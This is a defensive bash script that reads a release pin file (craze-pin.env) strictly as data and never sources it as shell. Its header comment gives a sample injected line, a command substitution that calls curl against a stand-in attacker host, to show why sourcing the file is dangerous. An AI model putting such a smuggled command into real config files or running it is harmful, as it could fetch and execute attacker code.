#!/usr/bin/env bash
# The ONE shared, strict reader for craze-pin.env (plan 025). NEVER source
# craze-pin.env as shell (`. craze-pin.env`) — every consumer
# (check-craze-pin.sh, the Makefile's craze-binaries/check-craze-pin
# targets, the craze-binaries composite action, release-plan.sh) calls this
# script instead.
#
# Why: craze-pin.env is a repo file that can carry attacker- or mistake-
# controlled content (e.g. a bad merge, a hand-edit). Sourcing it as shell
# lets a line like
#   CRAZE_TEST_SHA=$(curl evil.example/x); printf 'a3aa101d759f...'
# or a bare `SHED_RELEASE_SELFTEST=1` / `CRAZE_PIN_LS_REMOTE=/path/to/fake`
# run arbitrary commands or quietly flip the release-time check's seam.
# This script parses the file as DATA: only `CRAZE_TEST_SHA=` and
# `CRAZE_RELEASE=` lines are recognized, each value taken LITERALLY (no
# quote stripping, no expansion, no command substitution), and validated
# BEFORE it is ever printed or used by a caller. Any other non-comment,
# non-blank line is a hard error — a stray extra assignment in the file is
# refused, not silently ignored.
#
# The file stays shell-sourceable AS A FORMAT (plain `KEY=value` lines plus
# `#` comments) so a human can still read/edit it with a text editor and a
# shell syntax highlighter — this script just never actually sources it.
#
# Usage:
#   scripts/release/read-craze-pin.sh <path-to-craze-pin.env>
#     Validates the WHOLE file and prints, in this fixed order:
#       CRAZE_TEST_SHA=<40 lowercase hex>
#       CRAZE_RELEASE=<empty-or-X.Y.Z>
#
#   scripts/release/read-craze-pin.sh --field CRAZE_TEST_SHA|CRAZE_RELEASE <path>
#     Same full-file validation, but prints only that field's raw value (no
#     "KEY=" prefix) — the common case for a caller that wants one value.
#
# By the time either form prints a value, that value's charset is already
# restricted to [0-9a-f] (CRAZE_TEST_SHA) or [0-9.] (CRAZE_RELEASE, or
# empty) — safe for a caller to assign directly with no further quoting
# concerns, and never something a pin file could have smuggled a command
# into.
#
# Exit 2: usage.
# Exit 1: the file is missing; a non-comment, non-blank line isn't EXACTLY
#   `CRAZE_TEST_SHA=<value>` or `CRAZE_RELEASE=<value>` starting at column 1
#   (an indented assignment is an unexpected line, not a lenient match);
#   either key is missing or appears more than once; or a value contains
#   anything outside its exact literal shape (CRAZE_TEST_SHA: not exactly 40
#   lowercase hex; CRAZE_RELEASE: not exactly empty or X.Y.Z) — including a
#   trailing/leading space, tab or CR (so a CRLF-saved file, or an editor
#   that appended trailing whitespace, fails loudly instead of being
#   silently normalized). Only comment lines (`#`, optionally indented) and
#   blank/whitespace-only lines are skipped leniently; that leniency never
#   extends to a recognised key's line or value.

set -euo pipefail

FIELD=""
if [ "${1:-}" = "--field" ]; then
  FIELD="${2:-}"
  if [ $# -ge 2 ]; then
    shift 2
  else
    shift 1
  fi
  case "${FIELD}" in
    CRAZE_TEST_SHA | CRAZE_RELEASE) ;;
    *)
      echo "usage: $0 [--field CRAZE_TEST_SHA|CRAZE_RELEASE] <path-to-craze-pin.env>" >&2
      exit 2
      ;;
  esac
fi

FILE="${1:-}"
if [ -z "${FILE}" ]; then
  echo "usage: $0 [--field CRAZE_TEST_SHA|CRAZE_RELEASE] <path-to-craze-pin.env>" >&2
  exit 2
fi
if [ ! -f "${FILE}" ]; then
  echo "::error::${FILE} is missing" >&2
  exit 1
fi

sha_val=""
rel_val=""
sha_seen=0
rel_seen=0
sha_line=0
rel_line=0
line_no=0

# Literal byte values, built with `printf` (never a backslash escape inside
# a quoted string, which `tr`/`sed` portability across GNU and BSD cannot be
# trusted to interpret the same way) — used ONLY to recognise a blank line
# or a comment's leading indent, never to touch a recognised key's value.
TAB="$(printf '\t')"
CR="$(printf '\r')"

# IFS= preserves every byte on each read, including a trailing CR from a
# CRLF-saved file; `|| [ -n "$line" ]` picks up a final line with no
# trailing newline. NOTHING is trimmed from `line` itself before the
# CRAZE_TEST_SHA=/CRAZE_RELEASE= match below — an indented assignment, or
# one with trailing whitespace baked into its value, does not match the
# exact-column-1 pattern (or fails the value's own literal-shape check
# further down), so it is never silently normalized. The only leniency is
# recognising — and discarding outright, never parsing — a comment or a
# blank/whitespace-only line.
while IFS= read -r line || [ -n "${line}" ]; do
  line_no=$((line_no + 1))

  # Blank or whitespace-only (space/tab/CR, so a CRLF file's genuinely
  # blank lines still skip cleanly): safe to discard regardless of line-
  # ending style, and distinct from a CRAZE_TEST_SHA=/CRAZE_RELEASE= line
  # whose VALUE happens to contain only such bytes — that still reaches the
  # match below and fails the literal-shape check with its line number.
  blank_check="$(printf '%s' "${line}" | tr -d " ${TAB}${CR}")"
  if [ -z "${blank_check}" ]; then
    continue
  fi

  # A comment may be indented (cosmetic only — its content is discarded
  # either way); this leniency is comments-only and never reaches the
  # CRAZE_TEST_SHA=/CRAZE_RELEASE= match, which requires column 1 exactly.
  lead_trimmed="$(printf '%s' "${line}" | sed -E "s/^[ ${TAB}]+//")"
  case "${lead_trimmed}" in
    '#'*)
      continue
      ;;
  esac

  case "${line}" in
    CRAZE_TEST_SHA=*)
      if [ "${sha_seen}" -eq 1 ]; then
        echo "::error::${FILE}:${line_no}: CRAZE_TEST_SHA appears more than once" >&2
        exit 1
      fi
      sha_val="${line#CRAZE_TEST_SHA=}"
      sha_line="${line_no}"
      sha_seen=1
      ;;
    CRAZE_RELEASE=*)
      if [ "${rel_seen}" -eq 1 ]; then
        echo "::error::${FILE}:${line_no}: CRAZE_RELEASE appears more than once" >&2
        exit 1
      fi
      rel_val="${line#CRAZE_RELEASE=}"
      rel_line="${line_no}"
      rel_seen=1
      ;;
    *)
      echo "::error::${FILE}:${line_no}: unexpected line (only comments, blank lines, and exactly 'CRAZE_TEST_SHA=<value>' / 'CRAZE_RELEASE=<value>' starting at column 1 are allowed): $(printf '%q' "${line}")" >&2
      exit 1
      ;;
  esac
done < "${FILE}"

if [ "${sha_seen}" -ne 1 ]; then
  echo "::error::${FILE}: missing CRAZE_TEST_SHA" >&2
  exit 1
fi
if [ "${rel_seen}" -ne 1 ]; then
  echo "::error::${FILE}: missing CRAZE_RELEASE" >&2
  exit 1
fi

if ! printf '%s' "${sha_val}" | grep -Eq '^[0-9a-f]{40}$'; then
  echo "::error::${FILE}:${sha_line}: CRAZE_TEST_SHA value $(printf '%q' "${sha_val}") is not EXACTLY 40 lowercase hex characters (no surrounding space, tab or CR)" >&2
  exit 1
fi
if [ -n "${rel_val}" ] && ! printf '%s' "${rel_val}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
  echo "::error::${FILE}:${rel_line}: CRAZE_RELEASE value $(printf '%q' "${rel_val}") is neither empty nor EXACTLY X.Y.Z (no surrounding space, tab or CR)" >&2
  exit 1
fi

if [ -n "${FIELD}" ]; then
  case "${FIELD}" in
    CRAZE_TEST_SHA) printf '%s\n' "${sha_val}" ;;
    CRAZE_RELEASE) printf '%s\n' "${rel_val}" ;;
  esac
else
  printf 'CRAZE_TEST_SHA=%s\n' "${sha_val}"
  printf 'CRAZE_RELEASE=%s\n' "${rel_val}"
fi
